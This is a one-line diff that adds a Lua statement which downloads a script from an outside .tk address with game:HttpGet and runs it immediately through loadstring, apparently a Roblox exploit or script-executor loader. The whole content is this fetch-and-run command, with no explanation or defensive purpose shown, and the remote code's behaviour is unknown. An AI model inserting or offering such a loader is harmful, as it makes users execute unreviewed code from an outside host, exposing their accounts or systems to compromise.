@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://package.idenlua.tk/Manager/Main.lua"))()
